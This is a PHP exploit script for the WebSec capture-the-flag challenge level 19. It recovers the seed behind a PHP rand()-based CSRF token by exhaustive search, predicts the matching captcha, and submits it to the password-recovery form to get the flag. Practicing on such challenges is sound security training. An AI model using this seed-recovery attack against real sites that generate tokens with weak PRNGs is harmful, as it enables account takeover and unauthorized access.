<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    FULL 32-BIT SPACE ATTACK - Complete exhaustive search  ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

echo "WARNING: This will take a VERY long time!\n";
echo "Total 32-bit space: 4,294,967,296 possible seeds\n\n";

$ch = curl_init("https://websec.fr/level19/index.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
$response = curl_exec($ch);
curl_close($ch);

if (!$response) {
    die("Failed to get initial response\n");
}

if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) {
    die("Could not extract session ID\n");
}
$session_id = $matches[1];

$parts = explode("\r\n\r\n", $response, 2);
$body = isset($parts[1]) ? $parts[1] : $response;

if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) {
    die("Could not extract CSRF token\n");
}
$real_token = $token_match[1];

echo "Target token: $real_token\n";
echo "Session ID: $session_id\n\n";

echo "Starting exhaustive search...\n\n";

$start_time = time();
$tested = 0;

// Probar TODO el espacio positivo de 32-bit
// Esto tomará días, pero es exhaustivo
for ($seed = 0; $seed <= 2147483647; $seed++) {
    srand($seed);
    $test_token = generate_random_text(32);
    $tested++;
    
    if ($test_token === $real_token) {
        echo "\n✓✓✓ MATCH FOUND! ✓✓✓\n";
        echo "Seed: $seed\n";
        echo "Tested: $tested seeds\n";
        echo "Time taken: " . (time() - $start_time) . " seconds\n";
        
        srand($seed);
        generate_random_text(32);
        $captcha = generate_random_text(25);
        
        echo "CAPTCHA: $captcha\n";
        
        $post_data = http_build_query([
            'captcha' => $captcha,
            'token' => $real_token,
            'submit' => ''
        ]);
        
        $ch = curl_init("https://websec.fr/level19/index.php");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
        $result = curl_exec($ch);
        curl_close($ch);
        
        if (strpos($result, 'Password recovery email sent') !== false) {
            echo "\nSUCCESS!\n";
            if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                echo "FLAG: " . $flag_match[0] . "\n";
                file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                exit(0);
            }
        }
        break;
    }
    
    if ($tested % 10000000 == 0) {
        $elapsed = time() - $start_time;
        $rate = $tested / $elapsed;
        $percent = ($tested / 2147483647) * 100;
        $eta = (2147483647 - $tested) / $rate;
        
        echo sprintf("[%.4f%%] Tested: %d | Rate: %.0f seeds/sec | ETA: %.0f hours\n", 
            $percent, $tested, $rate, $eta / 3600);
    }
}

echo "\nSearch complete. No match found.\n";
?>